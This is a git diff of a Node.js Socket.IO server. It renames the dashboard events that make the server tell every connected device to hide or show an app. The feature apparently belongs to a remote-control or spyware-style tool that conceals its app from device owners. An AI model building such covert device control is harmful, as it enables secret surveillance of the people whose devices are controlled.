@@ -34,15 +34,15 @@ io.on("connection", (socket) => {
   });
 
   // ---------------- HIDE/SHOW APP FEATURE ----------------
-  // Dashboard -> Device
-  socket.on("hide-app", () => {
-    console.log("👻 Hide app command sent");
-    devices.forEach((id) => io.to(id).emit("hide-app"));
+  // Dashboard emits these events
+  socket.on("hide-app-server", () => {
+    console.log("👻 Dashboard requested to hide app");
+    devices.forEach((id) => io.to(id).emit("hide-app")); // send to all devices
   });
 
-  socket.on("show-app", () => {
-    console.log("📲 Show app command sent");
-    devices.forEach((id) => io.to(id).emit("show-app"));
+  socket.on("show-app-server", () => {
+    console.log("📲 Dashboard requested to show app");
+    devices.forEach((id) => io.to(id).emit("show-app")); // send to all devices
   });
   // -------------------------------------------------------
 
@@ -87,4 +87,3 @@ io.on("connection", (socket) => {
 server.listen(PORT, () => {
   console.log(`🚀 Server listening on port ${PORT}`);
 });
-
